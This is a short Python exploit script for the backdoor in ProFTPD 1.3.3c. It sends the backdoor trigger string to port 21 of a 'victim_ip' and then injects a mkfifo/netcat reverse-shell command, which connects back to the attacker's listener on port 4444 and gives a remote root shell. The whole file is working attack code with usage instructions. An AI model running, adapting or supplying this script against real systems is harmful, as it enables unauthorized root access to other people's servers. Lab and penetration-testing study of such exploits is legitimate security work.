"""
This script is using the backdoor contained in the ProFTPD 1.3.3c version,
to gain remote root access to the system which run this version.

NOTE: first open listener at port 4444.

written by: Jonathan Assayag
"""


from sys import argv
import socket
from time import sleep
import subprocess


__author__ = "Jonathan Assayag"


USAGE = "usage: python ProFTPD_133c.py <victim_ip>"

PAYLOAD_1 = "HELP ACIDBITCHEZ\n"
PAYLOAD_2 = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {my_ip} {my_port} >/tmp/f\n"


def run_cmd(cmd):
	return subprocess.check_output(cmd, shell=True).decode('utf-8') 


def main(argv):
	if len(argv) != 2:
		print(USAGE)
	else:
		victim_ip = argv[1]
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((victim_ip, 21))
		connection_response = s.recv(1024)

		s.send(PAYLOAD_1)
		print("sending payload...")
		sleep(1)
		ip = run_cmd("hostname -I").rstrip()
		s.send(PAYLOAD_2.format(my_ip=ip, my_port="4444"))
		s.close()
		print("Done!")


if __name__ == "__main__":
	main(argv)